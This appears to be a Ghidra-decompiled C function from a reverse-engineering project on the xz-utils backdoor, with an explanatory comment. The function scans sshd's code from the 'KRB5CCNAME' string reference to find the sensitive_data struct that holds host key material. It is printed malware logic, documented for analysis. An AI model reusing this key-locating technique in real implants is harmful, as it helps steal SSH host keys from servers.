// /home/kali/xzre-ghidra/xzregh/103340_sshd_get_sensitive_data_address_via_krb5ccname.c
// Function: sshd_get_sensitive_data_address_via_krb5ccname @ 0x103340
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_sensitive_data_address_via_krb5ccname(u8 * data_start, u8 * data_end, u8 * code_start, u8 * code_end, void * * sensitive_data_out, elf_info_t * elf)


/*
 * AutoDoc: Starts at the string reference to 'KRB5CCNAME', disassembles forward until it sees the getenv result copied into memory, and
 * only accepts stores that land inside sshd's .data/.bss window with the expected -0x18 displacement pattern. That combination
 * reliably identifies the sensitive_data struct that holds host key material after sshd propagates the Kerberos cache path.
 */

#include "xzre_types.h"

BOOL sshd_get_sensitive_data_address_via_krb5ccname
               (u8 *data_start,u8 *data_end,u8 *code_start,u8 *code_end,void **sensitive_data_out,
               elf_info_t *elf)

{
  undefined1 uVar1;
  BOOL BVar2;
  u8 *code_start_00;
  u8 *puVar3;
  uint uVar4;
  long lVar5;
  byte bVar6;
  u8 *puVar7;
  u8 *puVar8;
  dasm_ctx_t *pdVar9;
  undefined1 uVar10;
  byte bVar11;
  dasm_ctx_t insn_ctx;
  u8 *krb5_string_ref;
  u8 *candidate_store;
  u8 *data_cursor;
  dasm_ctx_t local_d8;
  dasm_ctx_t local_80;
  
  bVar11 = 0;
  pdVar9 = &local_d8;
  for (lVar5 = 0x16; lVar5 != 0; lVar5 = lVar5 + -1) {
    *(undefined4 *)&pdVar9->instruction = 0;
    pdVar9 = (dasm_ctx_t *)((long)&pdVar9->instruction + 4);
  }
  *sensitive_data_out = (void *)0x0;
  code_start_00 = elf_find_string_reference(elf,STR_KRB5CCNAME,code_start,code_end);
  if (code_start_00 != (u8 *)0x0) {
    while (code_start_00 < code_end) {
      BVar2 = x86_dasm(&local_d8,code_start_00,code_end);
      if (BVar2 == FALSE) {
        code_start_00 = code_start_00 + 1;
      }
      else {
        if ((*(u32 *)&local_d8.opcode_window[3] & 0xfffffffd) == 0xb1) {
          if (local_d8.prefix.decoded.modrm.breakdown.modrm_mod == '\x03') {
            if (((local_d8.prefix.flags_u16 & 0x20) == 0) ||
               (((byte)local_d8.prefix.decoded.rex & 8) == 0)) {
              uVar1 = local_d8.prefix.decoded.flags & 0x40;
              if ((local_d8.prefix.flags_u16 & 0x1040) == 0) {
                if ((local_d8.prefix.flags_u16 & 0x40) != 0) {
                  uVar10 = 0;
                  uVar1 = local_d8.prefix.decoded.modrm.breakdown.modrm_rm;
                  if ((local_d8.prefix.flags_u16 & 0x20) != 0) {
LAB_00103450:
                    uVar1 = local_d8.prefix.decoded.modrm.breakdown.modrm_rm | ((byte)local_d8.prefix.decoded.rex & 1) << 3;
                  }
                  goto LAB_0010345d;
                }
                uVar10 = 0;
              }
              else {
                if ((local_d8.prefix.flags_u16 & 0x40) == 0) {
                  uVar10 = local_d8.prefix.decoded.flags2 & 0x10;
                  if ((local_d8.prefix.flags_u16 & 0x1000) == 0) goto LAB_0010346b;
                  uVar10 = local_d8.imm64_reg;
                  if ((local_d8.prefix.flags_u16 & 0x20) != 0) {
                    uVar10 = local_d8.imm64_reg | ((byte)local_d8.prefix.decoded.rex & 1) << 3;
                  }
                }
                else {
                  uVar10 = local_d8.prefix.decoded.modrm.breakdown.modrm_reg;
                  uVar1 = local_d8.prefix.decoded.modrm.breakdown.modrm_rm;
                  if ((local_d8.prefix.flags_u16 & 0x20) != 0) {
                    uVar10 = local_d8.prefix.decoded.modrm.breakdown.modrm_reg |
                             (char)local_d8.prefix.decoded.rex * '\x02' & 8U;
                    goto LAB_00103450;
                  }
                }
LAB_0010345d:
                if (uVar1 != uVar10) goto LAB_001033d1;
              }
LAB_0010346b:
              pdVar9 = &local_80;
              for (lVar5 = 0x16; lVar5 != 0; lVar5 = lVar5 + -1) {
                *(undefined4 *)&pdVar9->instruction = 0;
                pdVar9 = (dasm_ctx_t *)((long)pdVar9 + (ulong)bVar11 * -8 + 4);
              }
              puVar8 = local_d8.instruction + local_d8.instruction_size;
              uVar4 = 0;
              while (((puVar8 < code_end && (uVar4 < 6)) &&
                     (BVar2 = x86_dasm(&local_80,puVar8,code_end), BVar2 != FALSE))) {
                if (*(u32 *)&local_80.opcode_window[3] == 0x109) {
                  if (((uint)local_80.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                    uVar1 = 0;
                    if ((local_80.prefix.flags_u16 & 0x1040) != 0) {
                      if ((local_80.prefix.flags_u16 & 0x40) == 0) {
                        uVar1 = local_80.prefix.decoded.flags2 & 0x10;
                        if (((local_80.prefix.flags_u16 & 0x1000) != 0) &&
                           (uVar1 = local_80.imm64_reg, (local_80.prefix.flags_u16 & 0x20) != 0)) {
                          bVar6 = (char)local_80.prefix.decoded.rex << 3;
                          goto LAB_00103553;
                        }
                      }
                      else {
                        uVar1 = local_80.prefix.decoded.modrm.breakdown.modrm_reg;
                        if ((local_80.prefix.flags_u16 & 0x20) != 0) {
                          bVar6 = (char)local_80.prefix.decoded.rex * '\x02';
LAB_00103553:
                          uVar1 = uVar1 | bVar6 & 8;
                        }
                      }
                    }
                    if (uVar1 == uVar10) {
                      puVar3 = (u8 *)0x0;
                      if ((local_80.prefix.flags_u16 & 0x100) != 0) {
                        puVar3 = local_80.instruction +
                                 local_80.instruction_size + local_80.mem_disp;
                      }
                      puVar7 = puVar3 + -0x18;
                      if ((data_start <= puVar7 && puVar3 != (u8 *)0x18) && (puVar3 + 4 <= data_end)
                         ) goto LAB_0010365f;
                    }
                  }
                }
                else if (*(u32 *)&local_80.opcode_window[3] == 0xa5fe) break;
                puVar8 = puVar8 + local_80.instruction_size;
                uVar4 = uVar4 + 1;
              }
            }
          }
        }
        else if (*(u32 *)&local_d8.opcode_window[3] == 0x147) {
          if ((((((byte)local_d8.prefix.decoded.rex & 8) == 0) &&
               ((uint)local_d8.prefix.decoded.modrm >> 8 == 0x50000)) &&
              ((local_d8.prefix.flags_u16 & 0x800) != 0)) && (local_d8.operand_zeroextended == 0)) {
            puVar8 = (u8 *)0x0;
            if ((local_d8.prefix.flags_u16 & 0x100) != 0) {
              puVar8 = local_d8.instruction + local_d8.instruction_size + local_d8.mem_disp;
            }
            puVar7 = puVar8 + -0x18;
            if (((puVar8 + 4 <= data_end) && (data_start <= puVar7)) && (puVar7 != (u8 *)0x0)) {
LAB_0010365f:
              *sensitive_data_out = puVar7;
              return TRUE;
            }
          }
        }
        else if ((*(u32 *)&local_d8.opcode_window[3] == 0xa5fe) && (code_start != local_d8.instruction)) {
          return FALSE;
        }
LAB_001033d1:
        code_start_00 = code_start_00 + local_d8.instruction_size;
      }
    }
  }
  return FALSE;
}

